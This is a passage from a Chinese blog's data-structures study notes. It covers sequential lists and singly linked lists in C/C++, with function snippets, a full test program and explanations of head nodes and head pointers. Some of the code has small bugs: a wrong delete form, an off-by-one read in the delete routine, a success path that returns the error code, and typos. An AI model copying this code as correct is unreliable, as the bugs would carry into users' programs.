class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//销毁线性表L</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DestoryList</span><span class="hljs-params">(Sqlist &amp;L)</span></span>&#123;<br><span class="hljs-keyword">if</span>(L.elem) <span class="hljs-keyword">delete</span> L.elem;<br>&#125;<br><br><span class="hljs-comment">//清空线性表L</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ClearList</span><span class="hljs-params">(Sqlist &amp;L)</span></span>&#123;<br>L.length = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//求线性表长度</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetLength</span><span class="hljs-params">(SqList L)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> L.length;<br>&#125;<br><br><span class="hljs-comment">//判断线性表是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(SqList L)</span></span>&#123;<br><span class="hljs-keyword">if</span>(L.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="获取顺序表某一位置上的元素">2.5.3获取顺序表某一位置上的元素</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始条件：顺序表L已存在</span><br><span class="hljs-comment">   操作结果：用e返回L中第i个数据元素的值 */</span><br><span class="hljs-function">Status <span class="hljs-title">GetElem</span><span class="hljs-params">(SqList L, <span class="hljs-type">int</span> i, ElemType &amp;e)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">1</span> || i&gt;L.length)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    e = L.elem[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="顺序表的查找">2.5.4 顺序表的查找</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LocateElem</span><span class="hljs-params">(SqList L,ElemType e)</span></span>&#123;<br>    <span class="hljs-comment">//在线性表中查找值为e的数据元素，返回其序号（是第几个元素）</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i&lt;L.length; i++)<br>        <span class="hljs-keyword">if</span>(L.elem[i] == e) <span class="hljs-keyword">return</span> i+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="顺序表的插入">2.5.5 顺序表的插入</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Status <span class="hljs-title">ListInsert_Sq</span><span class="hljs-params">(SqList &amp;L,<span class="hljs-type">int</span> i,ElemType e)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">1</span>||i&gt;L.length+<span class="hljs-number">1</span>)<span class="hljs-keyword">return</span> ERROR;<span class="hljs-comment">// 1 i值不合法</span><br>    <span class="hljs-keyword">if</span>(L.length == MAXSIZE)<span class="hljs-keyword">return</span> ERROR;<span class="hljs-comment">// 2 当前存储空间已满</span><br>    <span class="hljs-keyword">for</span>(j = L.length<span class="hljs-number">-1</span>; j &gt;= i<span class="hljs-number">-1</span>; j--)<br>        L.elem[j+<span class="hljs-number">1</span>] = L.elem[j];<span class="hljs-comment">// 3 插入位置及以后的元素后移</span><br>    L.elem[i<span class="hljs-number">-1</span>] = e;<span class="hljs-comment">// 4 将新元素e放入第i个位置</span><br>    L.length++;<span class="hljs-comment">// 5 表长增1</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="顺序表的删除">2.5.6 顺序表的删除</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Status <span class="hljs-title">ListDelete_Sq</span><span class="hljs-params">(SqList &amp;L,<span class="hljs-type">int</span> i)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>((i&lt;<span class="hljs-number">1</span>)||(i&gt;L.length)) <span class="hljs-keyword">return</span> ERROR;<span class="hljs-comment">// 1 i值不合法</span><br>    <span class="hljs-keyword">for</span>(j=i; j&lt;=L.length<span class="hljs-number">-1</span>; j++)<br>        L.elem[j<span class="hljs-number">-1</span>]=L.elem[j]; <span class="hljs-comment">// 2 被删除元素之后的元素前移</span><br>    L.length--; <span class="hljs-comment">// 3 表长减1</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="线性表小结">⭐线性表小结</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//对上面功能的全部实现，c++代码，但主要还是c语言的东西</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRUE 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FALSE 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW -2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100  <span class="hljs-comment">//线性表存储空间的初始分配量</span></span><br><br><span class="hljs-comment">//Status 是函数的类型，其值是函数结果状态代码</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Status;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;   <span class="hljs-comment">//ElemType的类型根据实际情况而定，这里假定为int</span><br><span class="hljs-comment">//顺序表数据结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span>&#123;<br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125;SqList;<br><br><span class="hljs-comment">// Function to print the elements of SqList</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OutPut</span><span class="hljs-params">(SqList L)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Length: %d, Elements: &quot;</span>, L.length);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; L.length; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, L.elem[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//构造一个空的顺序表L</span><br><span class="hljs-function">Status <span class="hljs-title">InitList</span><span class="hljs-params">(SqList &amp;L)</span></span>&#123;   <br>    L.elem = <span class="hljs-keyword">new</span> ElemType[MAXSIZE]; <span class="hljs-comment">//为顺序表分配空间， </span><br>    <span class="hljs-keyword">if</span>(!L.elem) <span class="hljs-built_in">exit</span>(OVERFLOW);<br>    L.length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//插入操作</span><br><span class="hljs-function">Status <span class="hljs-title">ListInsert_Sq</span><span class="hljs-params">(SqList &amp;L,<span class="hljs-type">int</span> i,ElemType e)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">1</span>||i&gt;L.length+<span class="hljs-number">1</span>)<span class="hljs-keyword">return</span> ERROR;<span class="hljs-comment">// 1 i值不合法</span><br>    <span class="hljs-keyword">if</span>(L.length == MAXSIZE)<span class="hljs-keyword">return</span> ERROR;<span class="hljs-comment">// 2 当前存储空间已满</span><br>    <span class="hljs-keyword">for</span>(j = L.length<span class="hljs-number">-1</span>; j &gt;= i<span class="hljs-number">-1</span>; j--)<br>        L.elem[j+<span class="hljs-number">1</span>] = L.elem[j];<span class="hljs-comment">// 3 插入位置及以后的元素后移</span><br>    L.elem[i<span class="hljs-number">-1</span>] = e;<span class="hljs-comment">// 4 将新元素e放入第i个位置</span><br>    L.length++;<span class="hljs-comment">// 5 表长增1</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除操作</span><br><span class="hljs-function">Status <span class="hljs-title">ListDelete_Sq</span><span class="hljs-params">(SqList &amp;L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> &amp;e)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">if</span>((i&lt;<span class="hljs-number">1</span>)||(i&gt;L.length)) <span class="hljs-keyword">return</span> ERROR;<span class="hljs-comment">// 1 i值不合法</span><br>    e = L.elem[i];<br>    <span class="hljs-keyword">for</span>(j=i; j&lt;=L.length<span class="hljs-number">-1</span>; j++)<br>        L.elem[j<span class="hljs-number">-1</span>]=L.elem[j]; <span class="hljs-comment">// 2 被删除元素之后的元素前移</span><br>    L.length--; <span class="hljs-comment">// 3 表长减1</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//获取顺序表某一位置上的元素</span><br><span class="hljs-function">Status <span class="hljs-title">GetElem</span><span class="hljs-params">(SqList L, <span class="hljs-type">int</span> i, ElemType &amp;e)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">1</span> || i&gt;L.length)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    e = L.elem[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//顺序表的查找，暂时有点问题</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LocateElem</span><span class="hljs-params">(SqList L,<span class="hljs-type">int</span> e)</span></span>&#123;<br>    <span class="hljs-comment">//在线性表中查找值为e的数据元素，返回其序号（是第几个元素）</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; L.length; i++)<br>        <span class="hljs-keyword">if</span>(L.elem[i] == e) <span class="hljs-keyword">return</span> i+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//求线性表长度</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetLength</span><span class="hljs-params">(SqList L)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> L.length;<br>&#125;<br><br><span class="hljs-comment">//判断线性表是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(SqList L)</span></span>&#123;<br><span class="hljs-keyword">if</span>(L.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    <span class="hljs-type">int</span> i, j;<br>    SqList L;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------构造一个空的线性表L------\n&quot;</span>);<br>    <span class="hljs-built_in">InitList</span>(L);<br>    <span class="hljs-built_in">OutPut</span>(L);  <span class="hljs-comment">//打印结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------测试插入10个数------\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= <span class="hljs-number">10</span>; i++)&#123;<br>        <span class="hljs-built_in">ListInsert_Sq</span>(L,i,i);<br>    &#125;<br>    <span class="hljs-built_in">OutPut</span>(L);  <span class="hljs-comment">//打印结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------在第三位之前插入0------\n&quot;</span>);<br>    <span class="hljs-built_in">ListInsert_Sq</span>(L,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">OutPut</span>(L);  <span class="hljs-comment">//打印结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------删除第6位的数据------\n&quot;</span>);<br>    <br>    <span class="hljs-type">int</span> e;<br>    <span class="hljs-built_in">ListDelete_Sq</span>(L,<span class="hljs-number">6</span>,e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除的数据为：%d\n&quot;</span>, e);<br>    <span class="hljs-built_in">OutPut</span>(L);  <span class="hljs-comment">//打印结果</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------获取元素操作------\n&quot;</span>);<br>    <span class="hljs-built_in">GetElem</span>(L,<span class="hljs-number">5</span>,e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;得到第5个元素：%d\n&quot;</span>, e);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------查找元素操作------\n&quot;</span>);<br>    i = <span class="hljs-built_in">LocateElem</span>(L,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;8在顺序表的序号是：%d\n&quot;</span>, i);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------线性表的长度------\n&quot;</span>);<br>    i = <span class="hljs-built_in">GetLength</span>(L);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;线性表的长度是：%d\n&quot;</span>, i);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------线性表是否为空------\n&quot;</span>);<br>    i = <span class="hljs-built_in">IsEmpty</span>(L);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;线性表是否为空（1空0不空）：%d&quot;</span>, i);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311191256344.png"alt="运行截图" /><figcaption aria-hidden="true">运行截图</figcaption></figure><p>优点</p><ul><li><p>存储密度大(结点本身所占用的空间/结点结构所占存储量)</p></li><li><p>可以随机存取表中任意位置的元素</p></li></ul><p>缺点</p><ul><li><p>插入、删除某一元素需移动大量元素</p></li><li><p>浪费存储空间</p></li><li><p>属于静态存储形式，当线性表长度变化较大时，难以确定存储空间的容量，数据元素的个数不能自由扩充</p></li></ul><h2 id="线性表的链式表示">2.6 线性表的链式表示</h2><p>用一组任意的存储单元存储线性表的数据元素(这组存储单元可以是连续的，也可以是不连续的，甚至是零散的分布在内存的任意位置，链表中元素的逻辑次序与物理次序不一定相同)</p><p>那怎么表示数据元素之间的逻辑关系呢？</p><p>在存储自己内容的同时也存储下一个元素的地址。</p><p>各结点由两个域组成：</p><ul><li>数据域：存储元素数值数据</li><li>指针域：存储直接后继结点的存储位置，指针域中存储的信息称作指针或链。</li></ul><h3 id="链式存储有关的术语">2.6.1 链式存储有关的术语</h3><ol type="1"><li><p>结点: 数据元素的存储映像。由数据域和指针域两部分组成</p></li><li><p>n个结点由指针链组成一个链表，它是线性表的链式存储映像，称为线性表的链式存储结构</p></li><li><p>单链表、双向链表、循环链表</p><ul><li>结点只有一个指针域的链表称为单链表或线性链表</li><li>结点有两个指针域的链表称为双链表</li><li>首尾相接的链表叫循环链表</li></ul></li><li><p>头结点：为了更加方便对链表进行操作，会在单链表的第1个结点前附设一个头结点。头结点的数据域可以不存储任何信息，也可以存储如线性表的长度等附加信息，头结点的指针域存储指向线性表第1个元素的结点。</p></li><li><p>头指针：指链表指向第一个结点的指针，若链表有头结点，则是指向头结点的指针;头指针具有标识作用，所以常用头指针冠以链表的名字;无论链表是否为空，头指针均不为空。头指针是链表的必要元素</p></li><li><p>头结点：头结点是为了操作的统一和方便而设立的，放在第一元素的结点之前，其数据域一般无意义（也可存放链表的长度）有了头结点，对在第一元素结点前插入结点和删除第一结点，其操作与其它结点的操作就统一了头结点不一定是链表必须要素</p></li><li><p>首元结点：是指链表中存储第一个数据元素的结点</p></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311201008349.png"alt="头指针，头结点，首元结点" /><figcaption aria-hidden="true">头指针，头结点，首元结点</figcaption></figure><p>讨论1：表示空表</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311201008372.png"alt="如何表示空表" /><figcaption aria-hidden="true">如何表示空表</figcaption></figure><p>讨论2：有头结点有什么好处？</p><ol type="1"><li>便于首元结点的处理首元结点的地址保存在头结点的指针域中,所以在链表的第一个位置上的操作和其它位置一致，无须进行特殊处理</li><li>便于空表和非空表的统一处理无论链表是否为空，头指针都是指向头结点的非空指针因此空表和非空表的处理也就统一了</li></ol><blockquote><p>当链表不设头结点时，假设L为单链表的头指针，它应该指向首元结点，则当单链表为长度n为0的空表时，L指针为空（判定空表的条件可记为：L==NULL)。增加头结点后，无论链表是否为空，头指针都是指向头结点的非空指针。头指针指向头结点。若为空表，则头结点的指针域为空（判定空表的条件可记为：L-&gt;next== NULL)</p></blockquote><p>讨论3: 头结点的数据域内装的是什么?</p><p>头结点的数据域可以为空，也可存放线性表长度等附加信息，但此结点不能计入链表长度值。</p><blockquote><p>顺序表每个元素的存储位置都可从线性表的起始位置计算得到。</p><p>而在单链表中，各个元素的存储位置都是随意的。取得第i个数据元素必须从头指针出发顺链进行寻找，也称为顺序存取的存取结构。</p><p><strong>顺序表是随机存取而链表是顺序存储</strong></p></blockquote><h3 id="单链表的定义和表示">2.6.2 单链表的定义和表示</h3><p>带头节点的单链表</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311211621933.png"alt="带头节点的单链表" /><figcaption aria-hidden="true">带头节点的单链表</figcaption></figure><p>单链表是由若干个结点构成，所以先定义一下结点。每一个结点都是有两部分组成，一部分是数据元素本身(<strong>数据域data</strong>)，其数据类型根据实际问题的需要确定。另一部分是指向下一个元素(结点)的指针(<strong>指针域next</strong>)存放下一个元素的地址，结点可以用C语言中的结构体实现当中包含两个成员。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*线性表的单链表存储结构*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;  <span class="hljs-comment">//声明结点的类型和指向结点的指针类型</span><br>    ElemType data;          <span class="hljs-comment">// 结点的数据域       </span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *next;     <span class="hljs-comment">// 结点的指针域,这里用自己来定义自己</span><br>&#125;LNode,*LinkList;                <br><span class="hljs-comment">// LNode 就表示定义了一个结点，如LNode a，那么可以操作a.data,a.next</span><br><span class="hljs-comment">// LinkList为指向结构体Lnode的指针类型 </span><br><span class="hljs-comment">// 比如头指针，它是指向这种节点的（有数据域有指针域）一个指针，那可以定义为：LNode *L，或者可以LinkList L</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">struct LNode&#123;  </span><br><span class="hljs-comment">    ElemType data;          </span><br><span class="hljs-comment">    struct LNode *next;     </span><br><span class="hljs-comment">&#125;; //这一部分我们是定义了一个结构类型</span><br><span class="hljs-comment">//加上typedef是将这种结构类型重新起了一个名字</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 定义链表L</span><br>LinkList L;  <span class="hljs-comment">//或者LNode *L，通常用LinkList定义单链表，强调定义的是某个单链表的头指针</span><br><span class="hljs-comment">// 定义结点指针p</span><br>LNode *p； <span class="hljs-comment">//或者LinkList p，通常用LNode *定义指向单链表中任意结点的指针变量</span><br><br><br></code></pre></td></tr></table></figure><p>例如，存储学生学号、姓名、成绩的单链表结点类型定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">student</span>&#123;<br>    <span class="hljs-type">char</span> num[<span class="hljs-number">8</span>];   <span class="hljs-comment">//数据域</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">8</span>];  <span class="hljs-comment">//数据域</span><br><span class="hljs-type">int</span> score;    <span class="hljs-comment">//数据域</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">student</span> *next; <span class="hljs-comment">//指针域</span><br>&#125;Lnode,*LinkList;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311211644294.png"alt="存储学生学号、姓名、成绩的单链表结点示意图" /><figcaptionaria-hidden="true">存储学生学号、姓名、成绩的单链表结点示意图</figcaption></figure><p>为了统一链表的操作，通常这样定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span>&#123;<br>    <span class="hljs-type">char</span> num[<span class="hljs-number">8</span>];  <span class="hljs-comment">//数据域</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">8</span>]; <span class="hljs-comment">//数据域</span><br><span class="hljs-type">int</span> score;    <span class="hljs-comment">//数据域</span><br>&#125;ElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Lnode</span>&#123;<br>    ElenType data;      <span class="hljs-comment">//数据域</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Lnode</span> *next; <span class="hljs-comment">//指针域</span><br>&#125;Lnode,*LinkList;<br></code></pre></td></tr></table></figure><h2 id="单链表基本操作的实现带头节点">2.7单链表基本操作的实现（带头节点）</h2><h3 id="单链表的初始化">2.7.1 单链表的初始化</h3><p>[算法步骤]</p><ol type="1"><li><p>生成新结点作为头结点，用头指针L指向头结点。</p></li><li><p>头结点的指针域置空</p></li></ol><p>[算法描述]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//LinkList定义如上</span><br><br><span class="hljs-function">Status <span class="hljs-title">InitList</span><span class="hljs-params">(LinkList &amp;L)</span></span>&#123;<br>    L = <span class="hljs-keyword">new</span> LNode; <span class="hljs-comment">//或者用c语法：L = (LinkList)malloc(sizeof(LNode));(LinkList)是强制类型转换</span><br>    L -&gt; next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//头结点的指针域置空，指针域就是这个指针所指的结点的next域</span><br>    <span class="hljs-comment">//指针变量怎么操作它所指的结点的next的域呢，指针变量要操作某个成员，用-&gt;</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="判断是否为空销毁清空求表长">2.7.2判断是否为空、销毁、清空、求表长</h3><p><strong>[补充算法1]</strong></p><p>判断链表是否为空</p><p>空表：链表中没有元素，但头指针和头结点仍存在，只是头结点的指针域为空</p><p>[算法思路]</p><p>判断头结点的指针域是否为空</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">(LinkList L)</span></span>&#123;  <span class="hljs-comment">//若L为空表返回1，非空返回0</span><br>    <span class="hljs-keyword">if</span>(L-&gt;next)   <span class="hljs-comment">//非空</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>[补充算法2]</strong></p><p>单链表的销毁：链表销毁后不存在</p><p>[算法思路]</p><p>从头指针开始，依次释放所有结点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span 